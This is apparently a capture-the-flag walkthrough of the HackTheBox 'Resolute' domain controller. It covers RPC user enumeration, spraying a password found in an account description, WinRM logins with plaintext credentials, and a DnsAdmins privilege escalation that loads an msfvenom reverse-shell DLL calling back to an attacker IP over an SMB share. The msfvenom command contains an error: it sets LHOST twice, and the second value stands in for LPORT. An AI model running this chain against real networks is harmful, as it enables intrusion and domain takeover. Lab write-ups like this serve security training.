nmap scan

```bash
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-12-14 17:10:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/14%Time=5FD79AE9%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m00s, deviation: 4h37m09s, median: 6m59s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-12-14T09:11:04-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-14T17:11:03
|_  start_date: 2020-12-14T17:06:28
```

### Enumerating RPC

Let's start by enumerating with rpcclient without logging in

```bash
$ rpcclient -U "" -N 10.10.10.169
```

Now let's enumerate usernames:

```bash
rpcclient $> enumdomusers                                                                                                                                                                     
user:[Administrator] rid:[0x1f4]                                                                                                                                                              
user:[Guest] rid:[0x1f5]                                                                                                                                                                      
user:[krbtgt] rid:[0x1f6]                                                                                                                                                                     
user:[DefaultAccount] rid:[0x1f7]                                                                                                                                                             
user:[ryan] rid:[0x451]                                                                                                                                                                       
user:[marko] rid:[0x457]                                                                                                                                                                      
user:[sunita] rid:[0x19c9]                                                                                                                                                                    
user:[abigail] rid:[0x19ca]                                                                                                                                                                   
user:[marcus] rid:[0x19cb]                                                                                                                                                                    
user:[sally] rid:[0x19cc]                                                                                                                                                                     
user:[fred] rid:[0x19cd]                                                                                                                                                                      
user:[angela] rid:[0x19ce]                                                                                                                                                                    
user:[felicia] rid:[0x19cf]                                                                                                                                                                   
user:[gustavo] rid:[0x19d0]                                                                                                                                                                   
user:[ulf] rid:[0x19d1]                                                                                                                                                                       
user:[stevie] rid:[0x19d2]                                                                                                                                                                    
user:[claire] rid:[0x19d3]                                                                                                                                                                    
user:[paulo] rid:[0x19d4]                                                                                                                                                                     
user:[steve] rid:[0x19d5]                                                                                                                                                                     
user:[annette] rid:[0x19d6]                                                                                                                                                                   
user:[annika] rid:[0x19d7]                                                                                                                                                                    
user:[per] rid:[0x19d8]                                                                                                                                                                       
user:[claude] rid:[0x19d9]                                                                                                                                                                    
user:[melanie] rid:[0x2775]                                                                                                                                                                   
user:[zach] rid:[0x2776]                                                                                                                                                                      
user:[simon] rid:[0x2777]                                                                                                                                                                     
user:[naoki] rid:[0x2778]  
```

Now with querydispinfo I found a Description with a passowrd:

```bash
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

The next thing is password spraying the services with the password `Welcome123!` and the list of users we have, for this I'll use crackmapexec

### Password spraying with a password

```bash
$ crackmapexec winrm 10.10.10.169 -u user-list.txt -p "Welcome123!"
---
---
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

### Credential found can be used to get a shell with evil-winrm

We can login with evil-winrm using `melanie` as user and `Welcome123!` as password

```bash
$ evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
```

### Enumerating the system as melanie

Now enumarating the system with `ls -force` I found this directory:

```
*Evil-WinRM* PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-       12/14/2020   9:06 AM      402653184 pagefile.sys
```

`PSTranscripts` have another directory `20191203` and a file:

```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
---
---
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
---
---
```

We have the password of `ryan`, log in as ryan.

### Enumerating as ryan

```bash
$ evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
```

In ryan desktop there's a note:

```
*Evil-WinRM* PS C:\Users\ryan\desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Enumerating ryan groups he's member of `DnsAdmins`:

```
*Evil-WinRM* PS C:\Users\ryan\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

### Exploiting dnscmd.exe because he's member of DnsAdmins

In lolbas you can find the vulnerability to privesc:

![image1](/assets/images/htb-resolute/resolute1.png)

First, generate a reverse shell:

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LHOST=9001 -f dll -o rev.dll
```

Then set up a listener:

```bash
$ nc -lvnp 9001
```

Set up a smbserver

```bash
$ sudo python3 /opt/impacket/examples/smbserver.py share `pwd`
```

Then set the server level plugin to the reverse shell on the smb share, then stop dns and after that start it
```
dnscmd.exe /config /serverlevelplugindll \\10.10.14.17\resolute\rev.dll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```

After you'll get a connection back 
